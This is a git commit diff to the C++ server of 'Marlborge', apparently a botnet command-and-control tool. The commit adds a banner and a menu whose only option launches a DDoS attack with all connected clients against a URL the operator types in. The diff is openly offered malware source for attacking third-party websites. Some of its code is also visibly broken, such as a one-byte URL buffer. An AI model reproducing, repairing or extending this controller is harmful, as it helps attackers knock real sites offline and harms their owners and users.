0e6f0d0c098a744e2b6d3ca30f032d5835fc9960
Preciado <xderoo58@gmail.com>
2022-03-08 20:57:03 +0100

    Server finished

--- Marlborge Server/Marlborge Server/main.cpp
+++ Marlborge Server/Marlborge Server/main.cpp
@@ -4,7 +4,26 @@
 
 #define LHOST "127.0.0.1" // Don't change this
 #define LPORT 3000 // Set to the port you set on the client
-#define MAXCONN 2 // Set the max number of connections
+#define MAXCONN 100000 // Set the max number of connections
+
+// Colors
+#define RESET   "\033[0m"
+#define BLACK   "\033[30m"      
+#define RED     "\033[31m"      
+#define GREEN   "\033[32m"      
+#define YELLOW  "\033[33m"      
+#define BLUE    "\033[34m"      
+#define MAGENTA "\033[35m"      
+#define CYAN    "\033[36m"      
+#define WHITE   "\033[37m"      
+#define BOLDBLACK   "\033[1m\033[30m"      
+#define BOLDRED     "\033[1m\033[31m"      
+#define BOLDGREEN   "\033[1m\033[32m"      
+#define BOLDYELLOW  "\033[1m\033[33m"      
+#define BOLDBLUE    "\033[1m\033[34m"      
+#define BOLDMAGENTA "\033[1m\033[35m"      
+#define BOLDCYAN    "\033[1m\033[36m"      
+#define BOLDWHITE   "\033[1m\033[37m"      
 
 using namespace std;
 
@@ -42,14 +61,45 @@ void Startup() {
 		exit(0);
 	}
 	listen(sock, MAXCONN);
-	cout << "Enter the URL for attacking: ";
-	cin.getline(buffer, sizeof(buffer));
+
+	cout << RED R""""(
+	
+_______ _______  ______        ______   _____   ______  ______ _______
+|  |  | |_____| |_____/ |      |_____] |     | |_____/ |  ____ |______
+|  |  | |     | |    \_ |_____ |_____] |_____| |    \_ |_____| |______
+                                                                       
+
+ ______ _______         _____  _______ ______  _______ ______ 
+|_____/ |______ |      |     | |_____| |     \ |______ |     \
+|    \_ |______ |_____ |_____| |     | |_____/ |______ |_____/
+                                                               
+	)"""" << endl;
+	cout << RED "By: " << YELLOW "PR3C14D0" << endl;
+	cout << endl << "Marlborge is listening for connections" << endl;
+
 	return;
 }
 
-void Listen() {
-	cout << "Listening for connections" << endl;
+int Menu() {
+	cout << BLUE << R""""(
++--------+-------+----------------------------------------------------+
+| Option | Name  |                    Description                     |
++--------+-------+----------------------------------------------------+
+|      1 | DDoS  | Makes a DDoS attack with all the connected clients |
++--------+-------+----------------------------------------------------+
 
+)"""";
+	int opt;
+	cout << RED "preciado@marlborge:~$ " << YELLOW;
+	cin >> opt;
+	cout << endl;
+	return opt;
+}
+
+void SendAttack() {
+	char url[] = "";
+	cout << endl << GREEN "Enter the URL you want to attack (with http[s]): " RED;
+	cin.getline(url, sizeof(url));
 	while (true) {
 		SOCKET client = accept(sock, NULL, NULL);
 		send(client, buffer, sizeof(buffer), 0);
@@ -58,7 +108,12 @@ void Listen() {
 
 int main() {
 	Startup();
-	Listen();
+	int opt = Menu();
+	switch (opt) {
+	case 1:
+		SendAttack();
+		break;
+	}
 
 	return 0;
 }
